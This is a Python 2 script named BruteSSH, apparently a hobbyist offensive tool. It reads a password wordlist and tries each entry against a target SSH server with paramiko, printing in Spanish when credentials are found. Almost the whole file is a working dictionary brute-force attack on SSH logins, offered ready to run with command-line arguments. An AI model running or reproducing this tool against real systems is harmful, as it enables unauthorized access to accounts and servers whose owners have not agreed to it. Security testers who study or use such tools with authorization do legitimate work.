#!/usr/bin/env python
# -*- coding: utf-8 -*-
#autor samir sanchez garnica @sasaga92

import paramiko
import os
import argparse
from multiprocessing.pool import Pool
import time

def script_colors(color_type, text):
    color_end = '\033[0m'

    if color_type.lower() == "r" or color_type.lower() == "red":
        red = '\033[91m'
        text = red + text + color_end
    elif color_type.lower() == "lgray":
        gray = '\033[2m'
        text = gray + text + color_end
    elif color_type.lower() == "gray":
        gray = '\033[90m'
        text = gray + text + color_end
    elif color_type.lower() == "strike":
        strike = '\033[9m'
        text = strike + text + color_end
    elif color_type.lower() == "underline":
        underline = '\033[4m'
        text = underline + text + color_end
    elif color_type.lower() == "b" or color_type.lower() == "blue":
        blue = '\033[94m'
        text = blue + text + color_end
    elif color_type.lower() == "g" or color_type.lower() == "green":
        green = '\033[92m'
        text = green + text + color_end
    elif color_type.lower() == "y" or color_type.lower() == "yellow":
        yellow = '\033[93m'
        text = yellow + text + color_end
    elif color_type.lower() == "c" or color_type.lower() == "cyan":
        cyan = '\033[96m'
        text = cyan + text + color_end
    elif color_type.lower() == "cf" or color_type.lower() == "cafe":
        cafe = '\033[52m'
        text = cafe + text + color_end
    else:
        return text
    return text

def banner_welcome():
    banner = '''
                  ██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗███████╗██╗  ██╗    
                  ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔════╝██║  ██║    
                  ██████╔╝██████╔╝██║   ██║   ██║   █████╗  ███████╗███████╗███████║    
                  ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ╚════██║╚════██║██╔══██║    
                  ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗███████║███████║██║  ██║    
                  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝  
                                                                        version: 1.0
                                                        Autor: Samir Sanchez Garnica
                                                                           @sasaga92
                                                                     
    '''
    return script_colors('lgray',banner)


def ssh_connect(host,port,username,password):
    code = True
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port, username, password)
    except paramiko.AuthenticationException:
        code = False
    ssh.close()
    return code

def main():
    print banner_welcome()

    localtime = time.asctime( time.localtime(time.time()) )
    print script_colors("lgray","[!] Inciando BruteSSH") + " " + script_colors("b",localtime)
    parser = argparse.ArgumentParser(description = 'SSH Bruteforce')
    parser.add_argument('--host', help = 'specify target host')
    parser.add_argument('--user', help = 'specify target user')
    parser.add_argument('--port', help = 'specify target port')
    parser.add_argument('--file', help = 'specify password file')
    args = parser.parse_args()
    if args.host and args.user and args.file:
        with open(args.file,'r') as infile:
            for line in infile:
                password = line.strip('\r\n')
                try:
                    connect = ssh_connect(args.host, args.port, args.user, password)

                    if connect:
                        print script_colors("lgray","[+] Contraseña encontrada en target: ") + script_colors("cf", str(args.host)) + " " + script_colors("lgray","credenciales:[") + script_colors("cf", str(args.user)) +  ":" + script_colors("g", str(password)) + "]"+script_colors("b"," Contraseña Correcta")
                        break
                    elif not connect:
                        print script_colors("lgray","[-] Probando en target: ") + script_colors("cf", str(args.host)) + " " + script_colors("lgray","credenciales:") + " " + script_colors("cf", str(args.user)) +  ":" + script_colors("c", str(password)) + script_colors("r"," Contraseña incorrecta")
                except:
                    pass
    else:
        print script_colors("yellow","[-] ") + script_colors("c", "Requiere parametros --host host --user user --port port  --file PathDiccionario ")
        exit(0)

if __name__ == '__main__':
    main()